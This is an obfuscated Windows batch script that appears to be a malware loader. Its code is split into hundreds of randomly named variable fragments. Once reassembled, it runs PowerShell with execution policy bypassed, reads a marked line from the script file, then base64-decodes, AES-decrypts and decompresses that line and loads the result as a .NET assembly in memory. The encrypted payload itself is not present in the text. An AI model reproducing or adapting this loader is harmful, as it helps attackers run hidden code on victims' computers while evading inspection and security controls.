@echo off
set "vtBRcUiytU=32"
set "qPvGldhjUe=cd"
set "EjMDsZfiFp= %~dp0"
set "uZmHcfBUbL=S46e"
set "tTOLuRxBRo=vert"
set "JxDWMbHvDg=m.IO"
set "AdncQBPQqt=tem."
set "EtGAqzwCvK=ct S"
set "LitcgxIGMs=$hjd"
set "JAwLxNCVce=gnir"
set "JLXgkmVIDr=Fina"
set "dlLjjcBuiC=O.Me"
set "uqjfzbYuOQ=tsWi"
set "JkaYcFiWdw=Comp"
set "jhahGOCggH=)($J"
set "cIGwwzXjqL=FnkJ"
set "ZvNzmyMFWu=ZYYc"
set "jLKPOTKdcH=lit("
set "pXYnNeQrvO=JBbj"
set "PkIwNVIRAq= [st"
set "iTNBkoEDWj=smV "
set "wHBhTfCWYt=:('g"
set "bDtOHqrJUP=o.Su"
set "wMxaSrADgV=saBm"
set "nsVMLtJZUh=d;$U"
set "ChqyPvbvXo=em.C"
set "HMQpWwTFBh=();$"
set "gJSWGzcGTb=pose"
set "QxPnCIzkJy=ypto"
set "wQAqimzPVy=join"
set "LKaPuJZGNV=kJ.D"
set "IyxxZmBcGu=ect "
set "xNZjFGjbNt=ddin"
set "VKyUcQjJIB=em.I"
set "uRGiFnwtwb=.Cry"
set "brVoLrmUNZ== [S"
set "NValAYFMdJ= = N"
set "PHAJpuGUcA=hB, "
set "pOVtdalXvd=gMod"
set "lNLVlbLgJQ=eam("
set "ZVrKMBOegh=)($g"
set "PDfOZczyqI=ptor"
set "SfwwXNTsBW=cubT"
set "GlkdTXjeAn=lBlo"
set "pybLGlGJLk=ateD"
set "ezOdXZWSms=();$"
set "IfiqYIWqId=bvsm"
set "JxUbXvWIMi=)) {"
set "pTgxgXZCvj=Stre"
set "pLBuqhXPKa=$JBb"
set "LpvqeCMpyO=dRN "
set "yvAhiweFIU=$eFn"
set "YkCbTDRfEV=Secu"
set "uReiemPmtB=ion."
set "FFOKdnSgde=[Sys"
set "xXESDhNijJ=cubT"
set "aWZMAAvVFg=;$bv"
set "ajtESIiBgW= [Sy"
set "tAdGnfJrsB=Obje"
set "DPMnJONVOQ=orF'"
set "JubLFnqiua=.GZi"
set "SbbJZNeehv=ert]"
set "TsqEDzKEWV=TllA"
set "dJwEoszZit=V.En"
set "tnWDdgEsqA=Syst"
set "kjbdFBpTFU='[-1"
set "tRcMFtYrBs=le  "
set "fHkLbVGABn=ke($"
set "AdxYNrsKzb=JBbj"
set "nSvNObNHZG= = ["
set "rpjPusHKKK=oryS"
set "IEpzEORaDp=.Sec"
set "GrmCzleUTD=nage"
set "DQMvmQmoeG=[Sys"
set "YTgxAFwazM=bstr"
set "jqHlWWcYAK='gni"
set "WEVuQSytWI=]::N"
set "xLjCFleKEP=P) {"
set "vqiFcWnyHR=mory"
set "cnKjXFkkpB=yste"
set "nDUGnJkGmB=$ULz"
set "DSCBmiveBJ=iIh."
set "fmcYdMsmLD=t = "
set "wwRAppCsRr=V = "
set "HQanbjuYYg=7Yiv"
set "xbYVDREKnb=dRN."
set "CrGHIHPvnW=-ep "
set "UvktCMLzEn=yste"
set "XDhDSaLqOs=comp"
set "IoJajYsfug=[]] "
set "CsSgtCagtp=-joi"
set "AZmjlRyQsC=g = "
set "CLbQmkfocl=J = "
set "fwAfxozyrm=$iJK"
set "jFXWiWEbCv=)))"
set "PFLKObhLCt=tS46"
set "MGMnHpbVKY=Bbjt"
set "gmaZINmOQv=y.Cr"
set "LFssjqDVOU=;$BL"
set "AOWBPWnKrh=.Com"
set "wXBpzceClQ=sGUc"
set "dPBHfSatbI=ne);"
set "sxcIYucOiu=Obje"
set "xWxmJjOnNT=[Env"
set "FtflhhwcBo=NmUo"
set "CVDoBWvmvB=ring"
set "CIcKgpQRNH=B = "
set "LaKcyXAFRW=('%*'"
set "MvycvyRWkH=esFX"
set "deMjMQLUvl=ode]"
set "qjQqEucNQA=ptog"
set "zSxJtYNaUI=ress"
set "JLleNIWMZd=oArr"
set "gyNPKEnYYn=] -j"
set "XzJdOoCzyv=tryP"
set "NrliTgQUJH=pres"
set "EQXneEVMei=th('"
set "ixJOPtNhqM=Secu"
set "vBTAZSmUVf=esaB"
set "PWGGSdjKQo=).Sp"
set "EWqkowPszh=736u"
set "BfcLPBfjtL=Star"
set "zEcPBGaiuS=cubT"
set "aEKiDVoMhR=UA);"
set "nYQepTyWeT=t = "
set "kauUatmBHW=File"
set "oWWXinStzZ=ewLi"
set "hXkMIRupbt=Ucub"
set "rRcVNCWuwS=ispo"
set "iFVEoQewve=, $J"
set "dDJugBOqat=e]::"
set "RBlKyCKTKC=);$B"
set "kkbLYTlwXb=-Obj"
set "WOmHFuAdPJ=t, 0"
set "MwBuxLpMtv= '')"
set "JugPbxcvfJ=OyzA"
set "YqwWMFTjMa=ddin"
set "mAMpjmtOJz=stem"
set "gpMbthGVLE=..-1"
set "plxAsMJRHw=1] -"
set "wKSrhAxPGE=]::("
set "NNfIBffdfv=.Cry"
set "iWXVRRnPZg=);$U"
set "irUjxqOwSh=v4Ir"
set "cCtnWVIrFA=0O+g"
set "qwNPNPHoNr=($IL"
set "rIYBYHyUWi=.IO."
set "kcydAXFOlP=ULzg"
set "grakrmGYVr=.Len"
set "dAkGzbplfP=ress"
set "IIzJjKgqzt=ionM"
set "bbnqaRlPnD=6esa"
set "JEYCAKaToP=n ''"
set "ZbLabgMKGJ=onve"
set "VzcQSYCOCF=sion"
set "pjoccHNsCH=PKCS"
set "LJEGKBjegB=('l0"
set "nbhSVejYxT=m.Re"
set "cKoMYYQSdp=JBbj"
set "tkVLsMSGel=pDZz"
set "NMDfwskmqg=.Mod"
set "MAGaIGHYcn=('%~f0'"
set "YEnLVXiRYh=-nop"
set "puPUurKpWp=);$e"
set "XuLosUgBCd=pher"
set "oOuApkfTzO=y.Pa"
set "EShRKvuTaD=$Ucu"
set "MgaSwgCWaU=urit"
set "VGxsrVUzqv='')("
set "ivcwyuPABY=daeR"
set "YWAIizpouP=ay()"
set "AZRhOWtOaw= New"
set "ZRqFEBpldd=comm"
set "fThavgBBfC=ss -"
set "qvuzpQlbmU=$iJK"
set "sGflIrjNyv=oin "
set "suhMfosBmG=fiIh"
set "inwTeidYFT=embl"
set "AfyWovWKsU=stem"
set "ejuTWrKaGR=cubT"
set "iLngQyVPur='txe"
set "qJOCbOdulp=k; }"
set "hynCZaRDZm=();$"
set "tXbXWBayAx=fore"
set "xWJbKbXhuE=jt);"
set "gxFwweZoYW=rt]:"
set "hUrtYrnnMO= [Sy"
set "mbItcUYIqp=.Mem"
set "eTofzTpKXn== $U"
set "CQCFTLiPHl=  $g"
set "IKOgLBGEJi=-1.."
set "PoonRnXega=NmUo"
set "dhlwuzauxO=UGTu"
set "xxgqcdHoUA=..-1"
set "BIaXXesXYv=6] -"
set "uVifgfzTTd=grap"
set "dYZYzDVepV=New-"
set "yuUidQAoZc=tem."
set "wXTyaaPtwB=]::("
set "dvJtpmxeDI=vj0m"
set "YhyvLUeFce=cubT"
set "vMChnycCuL=raph"
set "CkzDGSrfKv=Comp"
set "oAiGmMJuZx=tion"
set "knEAlvTuvZ=rity"
set "SBAzvoMfIK=BLXh"
set "IXuBggVVqI= = $"
set "GISeUwPJxh=gth)"
set "sWiAFIuLkV=Fo7l"
set "iwrmMhdopY=($IL"
set "DmThDktbam=:: '"
set "sAShOrlvdG=pStr"
set "hkgZwcOzAK===')"
set "yYrtbadoBd=oL'["
set "sbTiCAgtxT=;$Bf"
set "uqhdXiIetp=ptog"
set "JNICtoEGBe=+hAO"
set "DsobYRYluD= '')"
set "VOFUnGGwci=and "
set "CqTKtcwBLz=JKUA"
set "RTategASqw=.Key"
set "FsSjJxXtFh=[Sys"
set "VIYmzGtEtF=XhB."
set "fufdMDToPO=.Cop"
set "AJjQGJFILy=Disp"
set "ZaGCXFcSSw=);$i"
set "bkeBYxOCil=trea"
set "aluGvpIJkR=UA ="
set "JPcTWnyNQv=raph"
set "tziMxsqACF=$BLX"
set "PlbAKNhCva=brea"
set "ZPIJSXeUsJ=$iJK"
set "TdcyKErOZY='dqR"
set "cRueqhCNua=am;$"
set "XgdztOfwkv=; };"
set "WmkngcYvSV=ew-O"
set "AoUzpVXyeU=Bbjt"
set "HnaVFNKnoS=ILKl"
set "nbfrdVVmqT=se()"
set "WwJKrNLCMW=ecry"
set "LbyuZNTAGj=y]::"
set "FQlzCidqle=1..-"
set "gVTqpPQUBu=iron"
set "KBQQwcmDOx=Bmor"
set "jxUSvWCJEF=isfL"
set "lQPGeMvmIy=jt ="
set "arKKHGbTKo=nirt"
set "LnKXaPVpdA=16] "
set "gaDtVnbpuO=::('"
set "rKwmDjhxwg=e = "
set "nPJommVLvS=t Sy"
set "HKsZZzDeFw=stem"
set "bSGBLgMHOd=ck($"
set "RfsnorUZaH=Klo "
set "gGDaNCOmiB=yTo("
set "HNTMuhKSri=Syst"
set "KZYzTnmROw=oint"
set "JunwzOTVEf=join"
set "nuScIGQHBz=in $"
set "RhperUkGPy=, (,"
set "RfyvayNodB='[-1"
set "foqLXewFbi=gP ="
set "rhVRspeOBc=BC;$"
set "WMkFKxguxU=bypa"
set "KUjpgisecN=.Dis"
set "HuvrYrQBiC=y.Ci"
set "QSquvMfgbI=RN.T"
set "oEiHOORFAD=New-"
set "obPbvzTbwo=7;$U"
set "wtJSvNJftY=-joi"
set "CegvehrxvG=.Con"
set "OzbgXKEsOt=F'[-"
set "DdpPNoQKUs=T.Pa"
set "BEVelbPRlP=ment"
set "bLSyQDnbGQ=ress"
set "LgNljBkqwx=Klo."
set "nTaUXUqqno=n ''"
set "gLmNLsEqll=morF"
set "ObuQPROPVT=.Cre"
set "MhKVtWJfAE=[IO."
set "sgviyiyoPP==');"
set "fnaWaLUbwI=ose("
set "QarrNsCLTz=rity"
set "MPafpEONms=Mode"
set "wgFesfGtML=m.IO"
set "wgKoGrPESg=ct S"
set "mehAEjbbUR=.Dis"
set "fxRnteLWKb=Invo"
set "TPnRthbHCu=Conv"
set "eUPkdmgGXP=;$hj"
set "nZeaIkmyMk=bjec"
set "sTGmTEKXBd=);$U"
set "WDoEIqzokT=pose"
set "aRgJWEmZnP=$JBb"
set "TuwZOIUMsJ=;$hj"
set "jaPsYntSKH=yste"
set "DIVmWnUJSp=.-16"
set "CckhzorNqN=esMa"
set "CfZIVakctH=.Ass"
set "kDYMldSLUk= = $"
set "VLslNIbKaj=flec"
set "EjjOfEBSRg=eFnk"
set "hJvkmtnwCo=-4] "
set "cfDKCwvTfO=[-1."
set "KJXoJODpEf= if "
set "TVTLLLkTQj=rofi"
set "kfAeySvPFS=Disp"
set "GKgIGsJvSp=form"
set "uOZarPMKpN=('da"
set "KOYoCSwPZl=rans"
set "QnzYDstkGu=ing("
set "fgDvJNlTGH=3HWs"
set "oNDVyjKFjC=UA.T"
set "NMpUjLzJMx=ose("
set "hjbFRRwxnK=null"
set "vqYjNUHxJc=::De"
set "OIDbuZVPeG=]::C"
set "qwYTgFIYVX=ach "
set "rLgADOVHEh=rtS4"
set "DRAtmspIaY=bT.I"
set "wjOJneEFUP=3); "
set "civBgAGbWf=tem."
set "KxOPsvEpQQ=hy.A"
set "ScQKyhrwpd=m(, "
%SqynHWKugN%%WNCKgZRgJp%%oOjrRMRQWl%%vDoaIRlwnD%%ukgwNnTHfV%%KYzsSdggvV%%eTyUrtyCbp%%OuTfVdIMEE%%TjLaBxeWhE%%KebrzAMlfu%%OqGQhpetxP%%vtBRcUiytU%%oCuxEJtCGu%%rwHkPCDUSl%%tKyriqCkoE%%snSkflVimy%%WBNdyZLrbA%%qnFiAEecon%%gjncbdDxfD%%GvIuoRXvTj%%EliOneHKKB%%hTUYrMnLbv%%vomxTVFlTJ%%GJjfIVazOX%%vTMEwNAJcB%%DmtyNqZKUs%%ywRbUyJOpw%%MOWeaCBHbg%%uWjrfupLss%%VqFvyZcLJX%%dMuFPPppyk%%OrINXCmzWA%%jYwWAviAGa%"%~dp0%~nx0.exe"
cls
%qPvGldhjUe%%EjMDsZfiFp%
"%~nx0.exe" %YEnLVXiRYh%%TVTLLLkTQj%%tRcMFtYrBs%%CrGHIHPvnW%%WMkFKxguxU%%fThavgBBfC%%ZRqFEBpldd%%VOFUnGGwci%%nDUGnJkGmB%%foqLXewFbi%%hUrtYrnnMO%%AfyWovWKsU%%rIYBYHyUWi%%kauUatmBHW%%wXTyaaPtwB%%iLngQyVPur%%TsqEDzKEWV%%ivcwyuPABY%%RfyvayNodB%%xxgqcdHoUA%%plxAsMJRHw%%JunwzOTVEf%%MwBuxLpMtv%%MAGaIGHYcn%%PWGGSdjKQo%%jLKPOTKdcH%%xWxmJjOnNT%%gVTqpPQUBu%%BEVelbPRlP%%WEVuQSytWI%%oWWXinStzZ%%dPBHfSatbI%%tXbXWBayAx%%qwYTgFIYVX%%iwrmMhdopY%%RfsnorUZaH%%nuScIGQHBz%%kcydAXFOlP%%xLjCFleKEP%%KJXoJODpEf%%qwNPNPHoNr%%LgNljBkqwx%%BfcLPBfjtL%%uqjfzbYuOQ%%EQXneEVMei%%DmThDktbam%%JxUbXvWIMi%%CQCFTLiPHl%%FtflhhwcBo%%IXuBggVVqI%%HnaVFNKnoS%%bDtOHqrJUP%%YTgxAFwazM%%QnzYDstkGu%%wjOJneEFUP%%PlbAKNhCva%%qJOCbOdulp%%XgdztOfwkv%%aRgJWEmZnP%%lQPGeMvmIy%%ajtESIiBgW%%HKsZZzDeFw%%CegvehrxvG%%tTOLuRxBRo%%wKSrhAxPGE%%jqHlWWcYAK%%rLgADOVHEh%%bbnqaRlPnD%%KBQQwcmDOx%%OzbgXKEsOt%%FQlzCidqle%%LnKXaPVpdA%%CsSgtCagtp%%nTaUXUqqno%%ZVrKMBOegh%%PoonRnXega%%iWXVRRnPZg%%zEcPBGaiuS%%NValAYFMdJ%%WmkngcYvSV%%nZeaIkmyMk%%nPJommVLvS%%mAMpjmtOJz%%IEpzEORaDp%%MgaSwgCWaU%%gmaZINmOQv%%QxPnCIzkJy%%uVifgfzTTd%%KxOPsvEpQQ%%CckhzorNqN%%GrmCzleUTD%%nsVMLtJZUh%%ejuTWrKaGR%%NMDfwskmqg%%rKwmDjhxwg%%FsSjJxXtFh%%AdncQBPQqt%%ixJOPtNhqM%%knEAlvTuvZ%%uRGiFnwtwb%%uqhdXiIetp%%JPcTWnyNQv%%HuvrYrQBiC%%XuLosUgBCd%%MPafpEONms%%OIDbuZVPeG%%rhVRspeOBc%%hXkMIRupbt%%DdpPNoQKUs%%YqwWMFTjMa%%AZmjlRyQsC%%FFOKdnSgde%%yuUidQAoZc%%YkCbTDRfEV%%QarrNsCLTz%%NNfIBffdfv%%qjQqEucNQA%%vMChnycCuL%%oOuApkfTzO%%xNZjFGjbNt%%pOVtdalXvd%%dDJugBOqat%%pjoccHNsCH%%obPbvzTbwo%%YhyvLUeFce%%RTategASqw%%nSvNObNHZG%%HNTMuhKSri%%ChqyPvbvXo%%ZbLabgMKGJ%%gxFwweZoYW%%wHBhTfCWYt%%arKKHGbTKo%%uZmHcfBUbL%%wMxaSrADgV%%DPMnJONVOQ%%cfDKCwvTfO%%DIVmWnUJSp%%gyNPKEnYYn%%sGflIrjNyv%%VGxsrVUzqv%%TdcyKErOZY%%jxUSvWCJEF%%dhlwuzauxO%%JNICtoEGBe%%ZvNzmyMFWu%%tkVLsMSGel%%EWqkowPszh%%sWiAFIuLkV%%MvycvyRWkH%%wXBpzceClQ%%JugPbxcvfJ%%sgviyiyoPP%%EShRKvuTaD%%DRAtmspIaY%%wwRAppCsRr%%DQMvmQmoeG%%civBgAGbWf%%TPnRthbHCu%%SbbJZNeehv%%gaDtVnbpuO%%JAwLxNCVce%%PFLKObhLCt%%vBTAZSmUVf%%gLmNLsEqll%%kjbdFBpTFU%%gpMbthGVLE%%BIaXXesXYv%%wQAqimzPVy%%DsobYRYluD%%LJEGKBjegB%%irUjxqOwSh%%HQanbjuYYg%%fgDvJNlTGH%%dvJtpmxeDI%%cCtnWVIrFA%%hkgZwcOzAK%%eUPkdmgGXP%%LpvqeCMpyO%%eTofzTpKXn%%xXESDhNijJ%%ObuQPROPVT%%pybLGlGJLk%%WwJKrNLCMW%%PDfOZczyqI%%ezOdXZWSms%%AdxYNrsKzb%%fmcYdMsmLD%%LitcgxIGMs%%QSquvMfgbI%%KOYoCSwPZl%%GKgIGsJvSp%%JLXgkmVIDr%%GlkdTXjeAn%%bSGBLgMHOd%%cKoMYYQSdp%%WOmHFuAdPJ%%iFVEoQewve%%AoUzpVXyeU%%grakrmGYVr%%GISeUwPJxh%%TuwZOIUMsJ%%xbYVDREKnb%%kfAeySvPFS%%fnaWaLUbwI%%sTGmTEKXBd%%SfwwXNTsBW%%mehAEjbbUR%%WDoEIqzokT%%hynCZaRDZm%%SBAzvoMfIK%%CIcKgpQRNH%%oEiHOORFAD%%sxcIYucOiu%%EtGAqzwCvK%%jaPsYntSKH%%wgFesfGtML%%mbItcUYIqp%%rpjPusHKKK%%bkeBYxOCil%%ScQKyhrwpd%%pLBuqhXPKa%%xWJbKbXhuE%%fwAfxozyrm%%aluGvpIJkR%%AZRhOWtOaw%%kkbLYTlwXb%%IyxxZmBcGu%%tnWDdgEsqA%%VKyUcQjJIB%%dlLjjcBuiC%%vqiFcWnyHR%%pTgxgXZCvj%%cRueqhCNua%%EjjOfEBSRg%%CLbQmkfocl%%dYZYzDVepV%%tAdGnfJrsB%%wgKoGrPESg%%cnKjXFkkpB%%JxDWMbHvDg%%AOWBPWnKrh%%NrliTgQUJH%%VzcQSYCOCF%%JubLFnqiua%%sAShOrlvdG%%lNLVlbLgJQ%%tziMxsqACF%%PHAJpuGUcA%%MhKVtWJfAE%%CkzDGSrfKv%%bLSyQDnbGQ%%uReiemPmtB%%JkaYcFiWdw%%dAkGzbplfP%%IIzJjKgqzt%%deMjMQLUvl%%vqYjNUHxJc%%XDhDSaLqOs%%zSxJtYNaUI%%puPUurKpWp%%cIGwwzXjqL%%fufdMDToPO%%gGDaNCOmiB%%qvuzpQlbmU%%aEKiDVoMhR%%yvAhiweFIU%%LKaPuJZGNV%%rRcVNCWuwS%%nbfrdVVmqT%%LFssjqDVOU%%VIYmzGtEtF%%AJjQGJFILy%%NMpUjLzJMx%%ZaGCXFcSSw%%CqTKtcwBLz%%KUjpgisecN%%gJSWGzcGTb%%HMQpWwTFBh%%pXYnNeQrvO%%nYQepTyWeT%%ZPIJSXeUsJ%%oNDVyjKFjC%%JLleNIWMZd%%YWAIizpouP%%aWZMAAvVFg%%iTNBkoEDWj%%brVoLrmUNZ%%UvktCMLzEn%%nbhSVejYxT%%VLslNIbKaj%%oAiGmMJuZx%%CfZIVakctH%%inwTeidYFT%%LbyuZNTAGj%%uOZarPMKpN%%yYrtbadoBd%%IKOgLBGEJi%%hJvkmtnwCo%%wtJSvNJftY%%JEYCAKaToP%%jhahGOCggH%%MGMnHpbVKY%%RBlKyCKTKC%%suhMfosBmG%%kDYMldSLUk%%IfiqYIWqId%%dJwEoszZit%%XzJdOoCzyv%%KZYzTnmROw%%sbTiCAgtxT%%DSCBmiveBJ%%fxRnteLWKb%%fHkLbVGABn%%hjbFRRwxnK%%RhperUkGPy%%PkIwNVIRAq%%CVDoBWvmvB%%IoJajYsfug%%LaKcyXAFRW%%jFXWiWEbCv%
exit /b
